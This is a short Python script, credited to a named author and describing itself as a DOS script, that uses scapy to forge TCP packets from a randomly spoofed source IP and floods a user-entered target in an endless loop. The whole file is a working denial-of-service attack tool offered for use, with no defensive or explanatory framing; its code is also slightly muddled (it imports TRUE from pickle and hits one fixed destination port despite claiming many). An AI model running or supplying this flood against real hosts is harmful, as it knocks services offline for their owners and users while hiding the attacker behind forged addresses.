"""
By : Selakane Khaile
Discription: This is a DOS script that attacks only one target on multiple port at a time. 
"""
from pickle import TRUE
import random
from scapy.all import *

def address_spoofer():                      #function to spoff the IP
    address = [192,168,117,128]
    separate = '.'
    address[0] =str(random.randrange(12,196))
    address[1] =str(random.randrange(0,255))
    address[2] =str(random.randrange(0,255))
    address[3] =str(random.randrange(0,255))

    buildIP =address[0]+separate+address[1]+separate+address[2]+separate+address[3]
    print (buildIP)
    return buildIP
    
target_IP = input("Enter target: ")  #getting target IP

source_IP = address_spoofer()    #generating random attacker IP
source_port=8080
i = 1

while TRUE:                                 #infinite loop to send the flood pkts
    for source_port in range(1, 65535):
        IP1 = IP(src = source_IP, dst = target_IP)
        TCP1 = TCP(dport = 8080, sport=source_port)
        pkt = IP1 / TCP1
        send(pkt, inter = .001)
   
        print ("Packet sent ", i)
        i = i + 1